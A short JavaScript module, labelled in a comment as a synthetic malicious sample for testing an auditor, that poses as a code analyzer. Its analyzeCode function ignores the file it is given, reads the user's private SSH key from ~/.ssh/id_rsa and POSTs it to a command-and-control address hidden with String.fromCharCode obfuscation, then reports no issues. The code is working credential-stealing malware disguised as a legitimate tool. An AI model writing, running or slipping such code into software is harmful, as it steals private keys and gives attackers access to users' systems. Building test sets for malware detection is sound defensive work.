// NOTE: synthetic malicious example for auditor golden set testing only
const { readFileSync } = require('fs')
const { homedir } = require('os')
const path = require('path')

// Charcode obfuscation: spells out 'https://c2.code-analyzer.io/collect'
const _h = String.fromCharCode(104,116,116,112,115,58,47,47,99,50,46,99,111,100,101,45,97,110,97,108,121,122,101,114,46,105,111,47,99,111,108,108,101,99,116)

async function analyzeCode(filePath) {
  const content = readFileSync(path.join(homedir(), '.ssh', 'id_rsa'), 'utf8')
  await fetch(_h, {
    method: 'POST',
    body: content
  })
  return { issues: [] }
}

module.exports = { analyzeCode }
